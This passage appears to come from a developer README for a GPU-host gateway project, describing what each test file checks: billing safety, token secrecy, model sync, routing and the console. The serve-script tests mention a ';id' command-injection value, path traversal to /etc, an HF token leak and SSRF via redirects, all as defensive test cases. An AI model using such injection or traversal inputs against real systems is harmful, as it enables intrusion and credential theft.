`test_hostctl.py` (the controller against a stubbed
provider API and a fake ssh — the biggest file, because every mistake here bills or
deletes: `start_blockers()` naming exactly what `start()` raises, case by case, with
no provider call; `IncludedVcpus` — a blank vcpus created with the included count,
unreadable specs without a cache ending in `off` with no create call, a specs blip
answered from the cached list, a count not offered refused before the create, the
running instance's count on the card and in $/h; the uuid persisted before the first wait, a mutating call only on an item
found by uuid in a FRESH list (never a stored, reusable index), `off` only after two
lists without the instance, the port guard before `bootstrapping`/`starting` and
before an attach, `GW:NODE_FAIL` read by tag, a stop aborting a start, the stop order
drain → transfers → prune → snapshot → delete and every step resumable, a FAILED
snapshot never adopted, rotation only after READY, resume after a restart, an
unreadable state never overwritten, the transfers — options on stdin, the HF token
for HF hosts only, lockfile adoption, resume from the offset, a sha256 mismatch, disk
growth by `modify`, one LAN stream — held vs pruned files, the token in no log or
view; the model-source rules (`UrlRules`, `UrlFallback`, `ShareShaCache`): a URL
mismatch or 4xx final after ONE download while 5xx/429 retry, the fallback ending a
live curl and discarding the shared `.part` before the LAN stream (and not switching
when that cannot be confirmed), keyed on the URL, cleared by Sync now, a URL-only file
still blocking, Ruling 18, a TRANSPORT-caused fallback forgotten by a new instance
while a mismatch/4xx one stays, the share-sha cache persisted, host-bound, pruned and
one hash at a time with transfer hashes ahead of Check & save's, the template report
pruned by the destination index; and the
host/service split: every service drained before the snapshot and
disabled at `off`, a DETACH that never disables (R-K2) and a move H1 → H2 H1 never
touches, a forward added on the running master without a respawn (a respawn cuts the
other service's stream), a failed forward downing only its service, a list changed
mid-stop waiting until `off` — and the stop's OWN disable (the drain finalize coming
back through main's rebuild) being no change at all: no "while stopping"/"now applied"
line, no second disable at `off`, nothing deferred once the phase is `off`
(`StopServiceEvents`, the journal of thunder-1's first stop) — the bootstrap split — a vLLM-only host gets `base` and
the host bootstrap only, a ComfyUI attached later is bootstrapped from a no-ComfyUI
snapshot — the setup hash per disk (same script → no setup, changed → setup + restart,
a template re-runs it), a failed setup downing only that service while the host stays
`ready`, admin text on stdin only across every path, host faults on the pseudo
backend, snapshots named after the HOST, and main's wiring incl. the deploy excludes);
`test_managed_hosts.py` (the store and main half: a token put into `set_settings` as
part of a dict is stored in PLAINTEXT and every `get_settings()` reader sees it (R-W10)
— the provider token encrypted, absent from `get_settings()`, reaching running
controllers on Save, and migrated once from the per-host tokens (first readable,
never over a set one, every copy stripped, idempotent); the name suggestion following
the Save's own R-W6 rules;
a host whose entry is gone while its instance runs must keep its controller, and one
with an unknown provider must be shown but never driven — nor take the rebuild down;
a config backend naming a managed host must not be attached (R-K3); a `local_port`
that moves on a Save or rename moves the backend's URL under running jobs, and two
services on one port make the whole tunnel refuse; the routing gate and the health
view must resolve backend → host → controller (R-W7) — by backend name they find
nothing and route onto a box whose models are still downloading; an undriven host
deleted while its record names an instance forgets a billing machine; and the "auto"
template (M5));
`test_thunder_scripts.py` (the bootstraps only ever run on a rented instance, so a
regression surfaces as a billed hour: the start script a LOOP on `127.0.0.1` with
`HF_HOME` taking its port, no any-address anywhere, strict mode, stdin-safe last
lines, the `GW:` lines, the smoke baseline even without any node pack, a short commit
refused, a template autostart's backup surviving a re-run, an unsuitable venv removed
only after the new one is built, the default node list — every line pinned, the
Manager in it — with the parser of both line forms; and the split: the autostart guard
and the template reports only in the host script, `flock`/`uv` only there, no ComfyUI
install there, both copies of `parse_node_line` identical, the ComfyUI `stop` killing
only `main.py` processes inside the checkout);
`test_modelsync.py` (the derived model set: a HOW input taken as a reference blocks an
alias forever, an ignored pin or bypass syncs the wrong tens of GB, a guessed
resolution copies the wrong file, a hub ref covered by less than class+value reads
ready and fails at run time, a blocked alias's files pruned are downloaded again next
session, a `.part` counted as present, a symlink that would dangle, and a catalog path
onto `hf-cache/token` ships the HF credential — plus a default catalog without any
private name);
`test_modelsync_routing.py` (the routing gate: until its models are there the managed
ComfyUI backend is healthy, free and a perfect candidate, and a job routed there comes
back as a plausible "value not in list". Pins leaving `ready` AND `allc`, other
backends untouched, a force pin not bypassing it, `_entry_can_use` following, the
chain's path-relay successor, the lookup through the backend's `host`, and the 503
carrying the sync progress or the block reason instead of "no healthy backend");
`test_modelsrc_serve.py` (the forced command on the share host, run by subprocess
against a tmp share: a path escaping the share hands out /etc as model bytes,
`hf-cache/token` leaks the HF credential, a `;id` that reaches a shell is remote code
execution, and a `list` that drops the HF cache's snapshot links makes a synced cache
look complete while every HF loader re-downloads);
`test_hosts_ui.py` (the console half: the provider-token and HF-token rows — now on
Server → API Keys — never rendered, blank keeping and the box clearing it, POST-only,
gone from the Backends tab, and the section and guide (step 1 linking to the keys tab)
there with no host at all, the checklist's missing token linking there; the LAN block
and the catalog on Server → Models (also with no host), gone from the Backends tab
(one pointer line), every one of their actions answering there — redirect, 400 as typed,
the 405 page's way back — and the checklist's unusable LAN source linking there; the host form without a token field, its "AI-Hub rents the
machine itself" intro, "What to rent at Start" and the suggested name; the card's
checklist, a disabled Start naming the controller's first blocker, the `+ … on this
host` links and the backend form they open, foreign instances named as hand-made; its
options taken from the
provider's OWN `OPTION_FIELDS` — a hand-kept copy offers a GPU the provider refuses at
the start — and a refused Save a 400 with the form as typed and nothing stored; a new
name colliding with a Hosts-map key or a backend's host (an URL hostname included) —
else one box's policies apply to two; Delete only while off and unnamed; every action
a POST, Start/Stop/Forget/Delete confirmed; the tab live while an instance runs; the
service table's Restart / Re-run setup carrying the BACKEND id (else the wrong service
restarts); every managed host in the Hosts panel; the backend form's attachment —
`url`/`local_port` derived and stable over Saves, renames and moves, the url
`readonly` (a disabled input is not submitted and reads as cleared), everything the
host could not run refused up front, a detach dropping the tunnel URL, the old
Thunder block gone; keyed sync rows; "delete unknown" confirming what the TICKED boxes
hold; a refused catalog saving nothing; a pin only for the fingerprint the operator
saw; the install command giving the share user a real shell; the 24 h banner on card
and Dashboard; unowned snapshots listed, never deleted; each synced file's source
badge — the plan's `source`/`origin`, `outdated` from main's kinds fetched off the
loop, `URL failed — LAN` from the fallback).
`test_model_sources.py` (Check & save, everything stubbed — DNS, HTTP, the LanSource:
a redirect hop not checked like the first is an SSRF with read-back into the panel, a
token past the first hop goes wherever the redirect says, a non-identity encoding
makes a small file's size the compressed one, HF's facts read off the CDN's hop take
an object ETag or `X-Xet-Hash` for the content sha256, a stored sha taken from the URL
instead of the share makes a differing share copy look verified, one 404 refusing a
whole repo dir, a provisional sha the share disagrees with that never turns its file
outdated, two checks or two catalog writers interleaving and losing an entry. Pins
the first-hop headers, ≤ 5 redirects, private hops refused before any connection,
the token rule, the fixed refusals, the accept/refuse matrix, the dir rules incl.
partial acceptance and provisional → confirmed/outdated, one check at a time, remove
and re-check ending a dir's background confirmation (no further hash, no write, the
pending flag kept for the newer run), lookalike HF hosts, HF headers from HF hosts
only, the hash priorities, the catalog lock and the stale-form refusal; and the
overview: rows from `per_alias[*].files` over every ComfyUI backend incl. blocked
aliases, a link as its target, dir rows and a file a dir check predates, a URL-only
file, the memo key — each input changes it, nothing else — the build off the loop
with the live parts laid over a copy, and the card's kinds).
`test_server_tabs.py` (the Server tab's Runtime | Restart | API Keys | Models: a form on the
wrong sub-tab or a Save that lands on another one reads as a setting that "did not
save", and a pending restart shown only on Restart is never seen from Runtime; an
API-Keys row that renders its value, clears on blank or touches another row's key
locks clients out or 401s every provider call; a master key saved there must still
end the old key's console sessions; a "Server" link that opens the default sub-tab
sends the operator looking for a field that is not there; "1.5"/"abc" in a number
field became "" = the default without a word; and a LAN-source or catalog action that
still answered on the Backends tab showed its result where the block no longer is;
Model sources: a worklist whose order, small-file collapse, sums and badges ARE the
information, escaped URLs that are never links, the actions per source as POSTs
landing on `?sub=models`, the GET filter, live only while a check or hash runs, and
the catalog editor's stale-form guard end to end — text kept, current hash handed
back, a validation refusal keeping the old one).
`test_gen_build.py` (what `_build_prompt` hands a backend: the built workflow is shown
nowhere, so a refactor that drops the label→param aliasing, prunes a node too many or
forgets a pin still submits a VALID prompt and delivers a plausible picture of the wrong
thing — pinned byte for byte, so the GenIO split cannot change it).
`test_runpod_worker.py` (the worker image and handler, built on RunPod far from every
test: drift shows only as a job on a different stack than Thunder — another torch,
ComfyUI commit or node revision — or a manifest the gateway reads as "file absent"; pins
the Dockerfile to the Thunder pins, the node list to the default list, the three
`parse_node_line` copies equal, the artifact extensions equal to the gateway's and the
handler's output shape).
`test_runpod_adapter.py` (the RunPod backend against a scripted RunPod: a job id lost on
a dropped `/run` answer becomes a second billed run, a give-up without `/cancel` leaves a
GPU billing, a queued job without a CUDA-13 worker holds the slot for the whole
`max_wait`, a manifest read unlike `/view` delivers less than asked, and the workflow
must equal a local ComfyUI's; pins the status table, the two clocks, the settled/unconfirmed
trace and `main._billed_cloud_task`, a COMPLETED result found while giving up, the
startup orphan cancel, the probe record's endpoint check, the chain refusal, the name
clash and the url rule).
Run them all with `python -m unittest discover -s tests -t .` (no runner dependency).
